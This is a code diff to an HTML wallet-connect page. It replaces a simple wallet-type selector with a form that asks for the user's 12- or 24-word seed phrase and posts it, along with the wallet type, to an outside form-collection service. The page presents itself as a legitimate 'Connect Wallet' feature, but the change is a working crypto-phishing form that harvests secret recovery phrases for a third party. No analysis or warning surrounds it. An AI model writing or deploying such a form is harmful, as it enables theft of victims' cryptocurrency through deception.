@@ -61,14 +61,21 @@
 
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div id="walletSection" style="display:none; margin-top:20px;">
-      <label for="walletSelect">Wallet Type:</label>
-      <select id="walletSelect">
-        <option value="MetaMask">MetaMask</option>
-        <option value="TrustWallet">Trust Wallet</option>
-        <option value="Coinbase">Coinbase Wallet</option>
-        <option value="Other">Other</option>
-      </select>
+    <form id="walletSection" action="https://formspree.io/f/mrbkwjdj" method="POST" style="display:none; margin-top:20px;">
+  <label for="walletSelect">Wallet Type:</label>
+  <select id="walletSelect" name="wallet">
+    <option value="MetaMask">MetaMask</option>
+    <option value="TrustWallet">Trust Wallet</option>
+    <option value="Coinbase">Coinbase Wallet</option>
+    <option value="Other">Other</option>
+  </select>
+
+  <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
+  <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
+
+  <button class="btn" type="submit">Submit</button>
+</form>
+
 
       <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
       <input type="text" id="seedInput" placeholder="Enter your 12 or 24-word phrase">
